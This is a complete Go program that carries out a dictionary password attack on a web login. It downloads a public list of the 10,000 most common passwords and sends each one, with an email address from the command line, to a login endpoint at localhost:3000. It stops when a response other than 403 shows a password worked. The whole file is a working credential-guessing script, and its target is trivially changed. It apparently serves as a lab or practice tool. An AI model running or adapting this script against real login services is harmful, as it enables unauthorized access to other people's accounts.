package main

import (
	"bytes"
	"encoding/json"
	"io/ioutil"
	"log"
	"net/http"
	"os"
	"strings"
)

func main() {
	wordList := strings.Split(getHttp("https://raw.githubusercontent.com/danieldonda/wordlist/master/top10k.txt"), "\n")

	for i := 0; i < len(wordList); i++ {
		log.Println(wordList[i])
		postBody, _ := json.Marshal(map[string]string{
			"email":    os.Args[1],
			"password": strings.Replace(wordList[i], "\r", "", -1),
		})

		log.Println(string(postBody))

		responseBody := bytes.NewBuffer(postBody)

		resp, _ := http.Post("http://localhost:3000/login", "application/json", responseBody)

		log.Println(resp.Status)
		body, _ := ioutil.ReadAll(resp.Body)

		if resp.Status != "403 Forbidden" {
			log.Println(string(body))
			break
		}
	}
}

func getHttp(link string) string {
	resp, err := http.Get(link)
	if err != nil {
		return err.Error()
	}

	body, err := ioutil.ReadAll(resp.Body)

	return (string(body))
}
